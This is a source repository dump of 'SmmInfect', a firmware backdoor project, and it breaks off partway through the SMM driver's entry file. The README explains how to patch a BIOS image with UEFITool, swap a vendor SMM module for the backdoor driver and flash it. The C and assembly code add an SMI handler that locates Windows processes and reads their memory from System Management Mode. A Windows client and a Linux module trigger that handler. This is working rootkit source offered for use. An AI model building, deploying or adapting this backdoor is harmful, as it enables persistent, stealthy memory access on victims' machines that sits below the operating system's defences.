Project Path: arc_Oliver-1-1_SmmInfect_ym_4za3t

Source Tree:

```txt
arc_Oliver-1-1_SmmInfect_ym_4za3t
├── README.md
├── SmiLinux
│   ├── Makefile
│   ├── linuxdriver.c
│   ├── load_kernel.sh
│   └── smm.S
├── SmiUmWin
│   ├── SmiUm
│   │   ├── SmiUm.vcxproj
│   │   ├── SmiUm.vcxproj.filters
│   │   ├── SmiUm.vcxproj.user
│   │   └── entry.cpp
│   └── SmiUm.sln
├── SmmInfect
│   ├── SmmInfect.inf
│   ├── cache.nasm
│   ├── communication.c
│   ├── communication.h
│   ├── entry.c
│   ├── linux.c
│   ├── linux.h
│   ├── memory.c
│   ├── memory.h
│   ├── serial.c
│   ├── serial.h
│   ├── string.c
│   ├── string.h
│   ├── windows.c
│   └── windows.h
└── SmmInfect.dsc

```

`README.md`:

```md
## **About**

The project aims to bring the capabilities of SMM x86-64(System Management Mode) to usermode through a backdoor. The backdoor is triggered through a syscall that invokes an SMI on most systems.
This way, you can easily control the number of times the backdoor is triggered. The project consists of 2 modules. 
One SMM driver that has a registered SMI root handler and a normal usermode application that invokes the SMI's and dictates what information to be transceived.

SMM is an operating mode on the x86-64 processor with one of the highest privilege levels in the entire system.
SMM is built to be isolated and lower privilege should not be aware of its operations.
This isolation is done by waiting for all cores to rendezvous inside SMM before handling System Management Interrupts(SMI).
Other protections to prevent introspection have also been implemented on most firmware.

## **Requirements**

x86-64 processor. Both AMD and Intel are tested

Windows 10/11.

Linux (ubuntu 24.04.1 LTS) is supported with a showcase version.

Bios that supports [UEFI SMM variables](https://github.com/tianocore/tianocore.github.io/wiki/UEFI-Variable-Runtime-Cache) or TPM

Ability to flash bios. ( bios flashback is recommended )


## **Compiling and Installation**

**Compiling**

To compile the SMM driver ```SmmInfect.efi``` you will need the [edk2](https://github.com/tianocore/edk2) project and if you are on Windows you will also need [Visual studio build tools](https://stackoverflow.com/questions/40504552/how-to-install-visual-c-build-tools).
If you are unable to setup the edk2 project on Windows here is a good [tutorial](https://www.youtube.com/watch?v=jrY4oqgHV0o).

  * Place the github project inside edk2 project ```edk2/SmmInfect```

  * Edit ACTIVE_PLATFORM | TARGET | TARGET_ARCH inside ```edk2/Conf/target.txt``` to SmmInfect/SmmInfect.dsc | RELEASE | X64

  * Open ```Developer command promopt for VS 2022/2019``` and enter ```edksetup.bat``` then ```build```

To compile the usermode program just open the visual studio solution (SmiUm folder) and build it as Release x64.

If you get errors regarding memcpy. Try Disabling optimizations by modifying conf/tools_def.txt to this:
![path: ](https://i.imgur.com/iqptV7A.png "gg: ")

If you are unable to compile there are pre-compiled binaries.

**Installation**

Download and install [UEFITool 0.28.0](https://github.com/LongSoft/UEFITool/releases/tag/0.28.0).
Open UefiTool and go to File → Open image file. Choose the bios file you would like to patch.
Now choose an appropriate SMM module to patch out. Replace this SMM module with SmmInfect.efi.
![path: ](https://i.imgur.com/pb6r0Mu.png "patch: ")

Now save this bios file and flash your bios with it.
Then open up the usermode program to read the first 15 bytes of explorer.exe. 

To find an appropriate SMM module to patch you would either have to reverse it to see if it's not necessary for operating the computer. Or insert your one.
I am using ASUS Prime b650-plus with AMD ryzen 7 7800X3D and patching out this guid: {CE1FD2EA-F80C-4517-8A75-9F7794A1401E}
It also worked on an AMD ryzen 7 3700X
## **Credits**
Ekknod, for being a good mentor and some of his code is used. Check out his [projects](https://github.com/ekknod)

```

`SmiLinux/Makefile`:

```
obj-m += driver.o 

driver-objs := linuxdriver.o smm.o

CC = /usr/bin/x86_64-linux-gnu-gcc-13
AS = /usr/bin/x86_64-linux-gnu-gcc-13 

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules CC=$(CC) AS=$(AS)
clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean


```

`SmiLinux/linuxdriver.c`:

```c
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/kprobes.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/init.h>
#include <asm/io.h>
#include <linux/efi.h>

#define EFI_VARIABLE_NON_VOLATILE 0x00000001
#define EFI_VARIABLE_BOOTSERVICE_ACCESS 0x00000002
#define EFI_VARIABLE_RUNTIME_ACCESS 0x00000004

void smi_print(const char *fmt, unsigned long long val);
void trigger_smi(void);
extern void smi_linux(void);

void smi_print(const char *fmt, unsigned long long val)
{
    printk(pr_fmt(fmt), val);
}
EXPORT_SYMBOL(smi_print);

void trigger_smi(void)
{
    uint8_t data[8];
    efi_guid_t global_guid = {0x0};

    uint32_t attributes = EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS;
    if (!efi.get_variable)
    {
        pr_err("Efi get var NULL!\n");
        return;
    }
    (void)efi.set_variable(L"ZeptaVar", &global_guid, attributes, sizeof(data), data);
}

static int m_init(void)
{
    pr_info("module loaded\n");
    smi_linux();
    return 0;
}

static void m_exit(void)
{
    pr_info("module unloaded\n");
}

module_init(m_init);
module_exit(m_exit);

MODULE_LICENSE("GPL");

```

`SmiLinux/load_kernel.sh`:

```sh
sudo rmmod driver
sudo insmod driver.ko
sudo rmmod driver
sudo dmesg | tail

```

`SmiLinux/smm.S`:

```S
.section .rodata
str:
    .string "R12 changed: Kallsymslookupname: %llx\n"

.text
.global smi_linux
.extern smi_print

smi_linux:
    push %r12
    push %rax
    push %rbx
    push %rdi
    push %rsi

    movabsq $0x4848484848484848, %r12
    movq %r12, %rbx
	
    mov $0x42, %eax  
    outb %al, $0xB2    

    leaq str(%rip), %rdi  
    movq %r12, %rsi        
    xorl %eax, %eax        

    call smi_print

    pop %rsi
    pop %rdi
    pop %rbx
    pop %rax
    pop %r12
    jmp __x86_return_thunk

.size smi_linux, .-smi_linux


```

`SmiUmWin/SmiUm.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 17
VisualStudioVersion = 17.4.33213.308
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "SmiUm", "SmiUm\SmiUm.vcxproj", "{5603046C-BE5E-4982-BB2E-5DFC44A64F3A}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{5603046C-BE5E-4982-BB2E-5DFC44A64F3A}.Debug|x64.ActiveCfg = Debug|x64
		{5603046C-BE5E-4982-BB2E-5DFC44A64F3A}.Debug|x64.Build.0 = Debug|x64
		{5603046C-BE5E-4982-BB2E-5DFC44A64F3A}.Debug|x86.ActiveCfg = Debug|Win32
		{5603046C-BE5E-4982-BB2E-5DFC44A64F3A}.Debug|x86.Build.0 = Debug|Win32
		{5603046C-BE5E-4982-BB2E-5DFC44A64F3A}.Release|x64.ActiveCfg = Release|x64
		{5603046C-BE5E-4982-BB2E-5DFC44A64F3A}.Release|x64.Build.0 = Release|x64
		{5603046C-BE5E-4982-BB2E-5DFC44A64F3A}.Release|x86.ActiveCfg = Release|Win32
		{5603046C-BE5E-4982-BB2E-5DFC44A64F3A}.Release|x86.Build.0 = Release|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {66DE24F5-9FD3-4FC6-9C5C-05552F665D29}
	EndGlobalSection
EndGlobal

```

`SmiUmWin/SmiUm/SmiUm.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>16.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{5603046c-be5e-4982-bb2e-5dfc44a64f3a}</ProjectGuid>
    <RootNamespace>SmiUm</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;_CRT_SECURE_NO_WARNINGS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="entry.cpp" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`SmiUmWin/SmiUm/SmiUm.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="entry.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
</Project>
```

`SmiUmWin/SmiUm/SmiUm.vcxproj.user`:

```user
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="Current" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup />
</Project>
```

`SmiUmWin/SmiUm/entry.cpp`:

```cpp
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <winnt.h>
#include <winternl.h>
#include <windows.h>
#include <tbs.h>

#pragma comment(lib, "tbs.lib")
#pragma comment(lib, "ntdll.lib")

#define RTL_CONSTANT_STRING(s) { sizeof(s) - sizeof((s)[0]), sizeof(s), (PWSTR)s }
#define EFI_VARIABLE_NON_VOLATILE                          0x00000001
#define EFI_VARIABLE_BOOTSERVICE_ACCESS                    0x00000002
#define EFI_VARIABLE_RUNTIME_ACCESS                        0x00000004

extern "C"
{
    NTSYSAPI NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN Client, PBOOLEAN WasEnabled);
    NTSYSCALLAPI NTSTATUS NTAPI NtSetSystemEnvironmentValueEx(PUNICODE_STRING VariableName, LPGUID VendorGuid, PVOID Value, ULONG ValueLength, ULONG Attributes);
}

#pragma pack(1) // Ensure that alignment is 1-byte
typedef struct _SmmCommunicationProtocol
{
    UINT8 magic = 'i'; // Magic identifier 
    UINT8 process_name[30] = { 0 };
    UINT16 module_name[30] = { 0 };
    UINT64 offset = 0;
    UINT64 read_size = 0;
    UINT8 read_buffer[30] = { 0 };
    UINT64 smi_count = 2976579765;

} SmmCommunicationProtocol, * PSmmCommunicationProtocol;
#pragma pack() // reset

// Allocate a section so the SMM driver knows what section the communication payload is in.
#pragma section(".ZEPTA", read, write)
__declspec(allocate(".ZEPTA")) volatile SmmCommunicationProtocol protocol;

enum SmiType
{
    UefiRuntime,
    TpmAcpi
};

void TriggerSmi(SmiType type);
void TriggerSmiUefiRuntimeVariable();
void TriggerSmiTpmAcpi();
void main();


void main()
{
    printf("Size of protocol %x\n", (INT)sizeof(SmmCommunicationProtocol)); // 6b
    printf("Address of protocol %x\n", (INT)&protocol);

    while (true)
    {
        //Read the first 15 bytes of explorer.exe. This will include DOS header if the SMM module is setup correctly.
        strcpy_s((char*)protocol.process_name, sizeof(protocol.process_name), "explorer.exe");
        wcscpy_s((wchar_t*)protocol.module_name, sizeof(protocol.module_name) / sizeof(UINT16), L"explorer.exe");
        protocol.offset = 0;//= 0x2F000;
        protocol.read_size = 15;
        memset((void*)protocol.read_buffer, 0, sizeof(protocol.read_buffer));

        // Trigger a SMI and the driver will find this process.
        TriggerSmi(TpmAcpi);
        //TriggerSmi(UefiRuntime);

        // Print out the bytes the SMM driver read for us.
        printf("Smi count: %llu\n", protocol.smi_count);

        for (int i = 0; i < protocol.read_size; i++)
        {
            printf("%02X ", protocol.read_buffer[i]);
        }

        Sleep(1000);
    }
}

void TriggerSmi(SmiType type)
{
    if (type == UefiRuntime)
    {
        TriggerSmiUefiRuntimeVariable();
    }
    else if (type == TpmAcpi)
    {
        TriggerSmiTpmAcpi();
    }
    else
    {
        printf("Unknown SMI trigger\n");
    }
}

void TriggerSmiUefiRuntimeVariable()
{
    BOOLEAN e = false;
    //Get the right privileges to call NtSetSystemEnvironmentValueEx. ( SeSystemEnvironmentPrivilege )
    const NTSTATUS status = RtlAdjustPrivilege(22, true, false, &e);

    if (!NT_SUCCESS(status))
    {
        // We need admin privileges!
        printf("No suitable permission! Open as admin!\n");
        return;
    }

    GUID guid = { 0 };
    // Try to get a variable that doesn't exist so we don't trigger a runtime cache hit
    UNICODE_STRING name = RTL_CONSTANT_STRING(L"ZeptaVar");
    char buffer[8];
    NtSetSystemEnvironmentValueEx(&name, &guid, buffer, sizeof(buffer), EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS);
}

//The TPM2 definition block in ACPI table clearly defines how to trigger a SMI.
//https://github.com/tianocore/edk2/blob/master/SecurityPkg/Tcg/Tcg2Acpi/Tpm.asl
//https://github.com/tianocore/edk2/commit/1240a722f8466930cced7f7d40a3fb6a29efb146
void TriggerSmiTpmAcpi()
{
    BYTE buffer[256] = { 0u };
    UINT32 size = sizeof(buffer);
    TBS_RESULT result = TBS_SUCCESS;

    PTBS_HCONTEXT context = new TBS_HCONTEXT;
    TBS_CONTEXT_PARAMS2 params = { 0u };

    HANDLE token = NULL;
    TOKEN_ELEVATION elevation;
    DWORD retlen;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token))
    {
        printf("Could not open process token\n");
        delete context;
        return;
    }

    BOOL isAdmin = FALSE;
    if (GetTokenInformation(token, TokenElevation, &elevation, sizeof(elevation), &retlen))
    {
        isAdmin = elevation.TokenIsElevated;
    }
    else
    {
        printf("Could not get token information\n");
        CloseHandle(token);
        delete context;
        return;
    }

    if (!isAdmin)
    {
        printf("No suitable permission! Open as admin!\n");
        delete context;
        return;
    }

    params.version = TPM_VERSION_20;
    params.asUINT32 = 0;
    params.includeTpm20 = TRUE;

    // Create TBS contex
    result = Tbsi_Context_Create((PCTBS_CONTEXT_PARAMS)&params, context);
    if (result != TBS_SUCCESS)
    {
        printf("Could not create context: %x\n", result);
        delete context;
        return;
    }

    RtlZeroMemory(buffer, sizeof(buffer));
    buffer[0] = 0x00000005u;
    //buffer[0] = 0x00000002u;

    result = Tbsi_Physical_Presence_Command(*context, buffer, sizeof(DWORD), buffer, &size);
    //result = Tbsi_Physical_Presence_Command(*context, buffer, sizeof(DWORD) * 2, buffer, &size);

    if (result != TBS_SUCCESS)
    {
        printf("Command error: %x\n", result);
    }
    
    Tbsip_Context_Close(*context);
    delete context;
}

```

`SmmInfect.dsc`:

```dsc
[Defines]
    PLATFORM_NAME = SmmInfect
    PLATFORM_GUID = 07886e23-b344-468f-8a36-b91478fffacf
    PLATFORM_VERSION = 1.000
    DSC_SPECIFICATION = 0x0001001B
    OUTPUT_DIRECTORY = Build/SmmInfect
    SUPPORTED_ARCHITECTURES = X64
    BUILD_TARGETS = RELEASE
    SKUID_IDENTIFIER = DEFAULT

[LibraryClasses.common]
    !include MdePkg/MdeLibs.dsc.inc

    BaseLib|MdePkg/Library/BaseLib/BaseLib.inf
    BaseMemoryLib|MdePkg/Library/BaseMemoryLib/BaseMemoryLib.inf
    DebugLib|MdePkg/Library/BaseDebugLibNull/BaseDebugLibNull.inf
    DevicePathLib|MdePkg/Library/UefiDevicePathLib/UefiDevicePathLibOptionalDevicePathProtocol.inf
    MemoryAllocationLib|MdePkg/Library/UefiMemoryAllocationLib/UefiMemoryAllocationLib.inf
    PcdLib|MdePkg/Library/BasePcdLibNull/BasePcdLibNull.inf
    PrintLib|MdePkg/Library/BasePrintLib/BasePrintLib.inf
    UefiBootServicesTableLib|MdePkg/Library/UefiBootServicesTableLib/UefiBootServicesTableLib.inf
    UefiLib|MdePkg/Library/UefiLib/UefiLib.inf
    UefiRuntimeServicesTableLib|MdePkg/Library/UefiRuntimeServicesTableLib/UefiRuntimeServicesTableLib.inf
    UefiDriverEntryPoint|MdePkg/Library/UefiDriverEntryPoint/UefiDriverEntryPoint.inf
    DxeServicesTableLib|MdePkg/Library/DxeServicesTableLib/DxeServicesTableLib.inf
    SmmPeriodicSmiLib|MdePkg/Library/SmmPeriodicSmiLib/SmmPeriodicSmiLib.inf
    TimerLib|MdePkg/Library/BaseTimerLibNullTemplate/BaseTimerLibNullTemplate.inf
    HobLib|MdePkg/Library/DxeHobLib/DxeHobLib.inf
    MmServicesTableLib|MdePkg/Library/MmServicesTableLib/MmServicesTableLib.inf
    SynchronizationLib|MdePkg/Library/BaseSynchronizationLib/BaseSynchronizationLib.inf
    BaseCpuLib|MdePkg/Library/BaseCpuLib/BaseCpuLib.inf

[LibraryClasses.common.DXE_SMM_DRIVER]
    SmmMemLib|MdePkg/Library/SmmMemLib/SmmMemLib.inf
    SmmServicesTableLib|MdePkg/Library/SmmServicesTableLib/SmmServicesTableLib.inf

[Components]
    SmmInfect-main/SmmInfect/SmmInfect.inf

```

`SmmInfect/SmmInfect.inf`:

```inf
[Defines]
    INF_VERSION = 1.29
    BASE_NAME = SmmInfect
    FILE_GUID = A0F56EC8-CAC5-460B-8D1F-DBF4A0836C80
    MODULE_TYPE = DXE_SMM_DRIVER
    ENTRY_POINT = UefiMain
    PI_SPECIFICATION_VERSION       = 0x00010046
[Sources]
    entry.c
    memory.c
    string.c
    windows.c
    linux.c
    communication.c
    serial.c
    cache.nasm
 [Packages]
    MdePkg/MdePkg.dec
    UefiCpuPkg/UefiCpuPkg.dec
    MdeModulePkg/MdeModulePkg.dec
  
[LibraryClasses]
    UefiLib
    SmmMemLib
    UefiDriverEntryPoint
    HobLib
    SmmPeriodicSmiLib
    TimerLib
    MmServicesTableLib
    SynchronizationLib
    BaseCpuLib
    
[Protocols]
    gEfiSmmBase2ProtocolGuid
    gEfiSmmPeriodicTimerDispatch2ProtocolGuid
    gEfiSmmCpuProtocolGuid
    
[Depex]
    gEfiSmmPeriodicTimerDispatch2ProtocolGuid AND
    gEfiSmmBase2ProtocolGuid AND
    gEfiSmmCpuProtocolGuid

```

`SmmInfect/cache.nasm`:

```nasm
DEFAULT REL
SECTION .text

global ASM_PFX(DisableCache)
ASM_PFX(DisableCache):
  mov     rax, cr0
  bts     rax, 30
  btr     rax, 29
  mov     cr0, rax
  wbinvd
  ret

global ASM_PFX(EnableCache)
ASM_PFX(EnableCache):
  wbinvd
  mov     rax, cr0
  btr     rax, 29
  btr     rax, 30
  mov     cr0, rax
  ret

global ASM_PFX(ClearCache)
ASM_PFX(ClearCache):    
  call DisableCache
  call EnableCache
  ret
```

`SmmInfect/communication.c`:

```c
#include "communication.h"
#include "windows.h"
#include "memory.h"
#include "serial.h"
#include <Library/UefiLib.h>
#include <Protocol/SmmCpu.h>
#include <Uefi.h>
#include <Protocol/SmmCpu.h>
#include <PiSmm.h>

UINT64 SmiCountIndex = 0;

UINT64 GetCommunicationProcess()
{
    return GetWindowsEProcess((char*)"SmiUM.exe");
}

EFI_STATUS PerformCommunication()
{
    SmiCountIndex++;

    // Get ntoskrnl base and the kernel context
    UINT64 kernel = GetWindowsKernelBase();
    UINT64 cr3 = GetWindowsKernelCr3();
    if (!kernel || !cr3)
    {
        return EFI_NOT_FOUND;
    }

    // Get the process we write our communication buffer to
    UINT64 cprocess = GetCommunicationProcess();
    if (cprocess)
    {
        UINT64 base = GetWindowsBaseAddressModuleX64(cprocess, L"SmiUM.exe");

        if (base)
        {
            UINT64 section = GetWindowsSectionBaseAddressX64(cprocess, base, (unsigned char*)".ZEPTA");
            //UINT8* ReadVirtual(UINT64 address, UINT64 cr3, UINT8* buffer, UINT64 length);

            if (section)
            {
                SmmCommunicationProtocol protocol = { 0 };
                ReadVirtual(section + 0b0, GetWindowsProcessCr3(cprocess), (UINT8*)&protocol, (UINT64)sizeof(SmmCommunicationProtocol));
                if (protocol.magic != SMM_PROTOCOL_MAGIC)
                {
                    return EFI_NOT_FOUND;
                }

                UINT64 tprocess = GetWindowsEProcess((char*)protocol.process_name);
                //SERIAL_PRINT("Translated rtm: %llx %llx  \r\n", TranslatePhysicalToVirtual(GetWindowsKernelCr3(), TranslateVirtualToPhysical(GetWindowsKernelCr3(), tprocess)), tprocess);

                if (tprocess == 0)
                {
                    return EFI_NOT_FOUND;
                }

                UINT64 tbase = GetWindowsBaseAddressModuleX64(tprocess, protocol.module_name);

                if (tbase == 0)
                {
                    return EFI_NOT_FOUND;
                }

                *(UINT64*)(TranslateVirtualToPhysical(GetWindowsProcessCr3(cprocess), section + SMI_COUNT_OFFSET)) = SmiCountIndex;

                ReadVirtual(tbase + protocol.offset, GetWindowsProcessCr3(tprocess), protocol.read_buffer, protocol.read_size);

                // Section starts at new frame and struct is not bigger then a page size. So we can get away with only translating one time
                UINT64 temp = TranslateVirtualToPhysical(GetWindowsProcessCr3(cprocess), section + READ_BUFFER_OFFSET);

                for (UINT64 i = 0; i < protocol.read_size; i++)
                {
                    *(UINT8*)(temp + i) = protocol.read_buffer[i];
                }
            }
        }
    }
    return EFI_SUCCESS;
}

```

`SmmInfect/communication.h`:

```h
#pragma once 
#include <Uefi.h>
#include <PiSmm.h>
#include <Protocol/SmmCpu.h>
#define SMM_PROTOCOL_MAGIC 'i'
#define MAGIC_OFFSET 0
#define PROCESS_OFFSET 1
#define MODULE_OFFSET 31
#define MEMORY_OFFSET 91
#define READ_SIZE_OFFSET 99
#define READ_BUFFER_OFFSET 107
#define SMI_COUNT_OFFSET 137


#pragma pack(1) // Ensure that alignment is 1-byte
typedef struct _SmmCommunicationProtocol
{
    UINT8 magic; // offset 0
    UINT8 process_name[30]; // offset 1
    UINT16 module_name[30]; // offset 31
    UINT64 offset; // offset 91
    UINT64 read_size; // offset 99
    UINT8 read_buffer[30]; // offset 107
    UINT64 smi_count; // offset 137
} SmmCommunicationProtocol, * PSmmCommunicationProtocol; // size 145
#pragma pack() // reset

UINT64 GetCommunicationProcess();
EFI_STATUS PerformCommunication();

```

`SmmInfect/entry.c`:

```c
#include "communication.h"
#include "memory.h"
#include "windows.h"
#include "linux.h"
#include "serial.h"
#include <Uefi.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/UefiRuntimeServicesTableLib.h>
#include <PiDxe.h>
#include <Library/BaseLib.h>
#include <Library/DebugLib.h>
#include <Protocol/SmmCpu.h>

static EFI_SMM_BASE2_PROTOCOL* SmmBase2;
static EFI_SMM_SYSTEM_TABLE2* GSmst2;
static BOOLEAN OS = FALSE;
static EFI_SMM_CPU_PROTOCOL* Cpu = NULL;

VOID EFIAPI ClearCache();

EFI_STATUS EFIAPI SmiHandler(EFI_HANDLE dispatch, CONST VOID* context, VOID* buffer, UINTN* size)
{
    GSmst2->SmmLocateProtocol(&gEfiSmmCpuProtocolGuid, NULL, (VOID**)&Cpu);
    SERIAL_INIT();
    SERIAL_PRINT("Handler called!\r\n");

    if (!EFI_ERROR(SetupWindows(Cpu, GSmst2)))
    {
        OS = TRUE;
        if (!EFI_ERROR(PerformCommunication()))
        {
            return EFI_SUCCESS;
        }
    }

    if (!EFI_ERROR(SetupLinux(Cpu, GSmst2)))
    {
        OS = TRUE;
        // Linux hook not implemented yet
    }

